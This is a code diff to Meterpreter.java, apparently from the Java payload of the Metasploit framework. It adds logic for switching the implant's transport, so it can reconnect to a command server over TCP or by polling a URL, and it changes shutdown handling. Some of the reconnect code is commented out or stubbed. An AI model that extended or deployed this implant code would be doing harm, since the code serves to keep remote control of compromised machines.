@@ -6,8 +6,10 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
+import java.io.InvalidObjectException;
 import java.io.OutputStream;
 import java.io.PrintStream;
+import java.net.Socket;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.net.URLConnection;
@@ -33,8 +35,8 @@ public class Meterpreter {
     private List/* <Channel> */channels = new ArrayList();
     private final CommandManager commandManager;
     private final Transport transport;
-    private final DataInputStream in;
-    private final DataOutputStream out;
+    private DataInputStream in;
+    private DataOutputStream out;
     private final Random rnd = new Random();
     private final ByteArrayOutputStream errBuffer;
     private final PrintStream err;
@@ -85,6 +87,32 @@ public class Meterpreter {
         }
     }
 
+    public void switchTransport() throws IOException {
+
+        if (transport.next != null) {
+            if (transport.transport_next_wait != 0) {
+                try {
+                    Thread.sleep(transport.transport_next_wait);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                transport.transport_next_wait = 0;
+            }
+            transport.current = transport.next;
+            transport.next = null;
+        }
+
+        if (transport.current.url.startsWith("tcp")) {
+//            String[] parts = transport.current.url.split(":");
+//            Socket msgsock = new Socket(parts[1].substring(2), Integer.parseInt(parts[3]));
+//            DataInputStream in = new DataInputStream(msgsock.getInputStream());
+//            DataOutputStream out = new DataOutputStream(msgsock.getOutputStream());
+        } else {
+//            tryUrl(transport.current.url);
+        }
+
+    }
+
     public void startExecuting() throws Exception {
         try {
             while (true) {
@@ -105,6 +133,26 @@ public class Meterpreter {
             ex.printStackTrace();
         }
         out.close();
+
+        if (transport.transport_next_wait != 0) {
+            try {
+                Thread.sleep(transport.transport_next_wait * 1000L);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+            transport.transport_next_wait = 0;
+            if (transport.current.url.startsWith("tcp")) {
+                out.close();
+                throw new InvalidObjectException("lol");
+//                String[] parts = transport.current.url.split(":");
+//                Socket msgsock = new Socket(parts[1].substring(2), Integer.parseInt(parts[3]));
+//                in = new DataInputStream(msgsock.getInputStream());
+//                out = new DataOutputStream(msgsock.getOutputStream());
+            } else {
+                pollURL(new URL(transport.current.url), 3600, 1000);
+            }
+        }
+
         synchronized (this) {
             for (Iterator it = channels.iterator(); it.hasNext(); ) {
                 Channel c = (Channel) it.next();
@@ -171,6 +219,11 @@ public class Meterpreter {
         } catch (Throwable t) {
             t.printStackTrace(getErrorStream());
             result = Command.ERROR_FAILURE;
+        }
+        if (result == Command.ERROR_SHUTDOWN) {
+            response.add(TLVType.TLV_TYPE_RESULT, Command.ERROR_SUCCESS);
+            writeTLV(PACKET_TYPE_RESPONSE, response);
+            return null;
         }
         response.add(TLVType.TLV_TYPE_RESULT, result);
         return response;
